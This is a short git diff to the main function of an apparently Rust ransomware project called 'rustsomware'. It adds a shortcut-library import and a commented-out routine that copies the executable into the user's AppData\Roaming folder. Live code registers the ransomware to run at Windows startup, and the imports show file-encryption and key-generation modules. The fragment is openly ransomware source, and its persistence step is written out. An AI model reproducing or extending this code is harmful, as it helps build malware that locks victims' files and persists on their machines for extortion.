@@ -10,6 +10,7 @@ use encryption::encryptor;
 use encryption::key_gen;
 use fs_extra;
 use mountpoints;
+use mslnk::ShellLink;
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
 use smart_dir::dir_list;
@@ -27,6 +28,28 @@ use system_changer::registry_changer;
 use walkdir::WalkDir;
 
 fn main() {
+    /*
+    let exec_name = match registry_changer::get_exec_name() {
+        Some(name) => name,
+        None => return,
+    };
+
+    println!("Exec name: {}", &exec_name);
+
+    // Copy the program to a different path
+    match dir_list::get_home_dir() {
+        Some(dir) => {
+            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
+            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\rustsomware.exe";
+            let lnk = target.clone() + ".lnk";
+            fs::create_dir(&destination);
+            fs::copy(&exec_name, &target).unwrap();
+            println!("Fully copied exe.")
+        }
+        None => println!("No dir with home dir data!"),
+    }
+
+    println!("Finished program execution!");*/
     // Adds program to startup
     registry_changer::start_ransomware_on_startup();
 
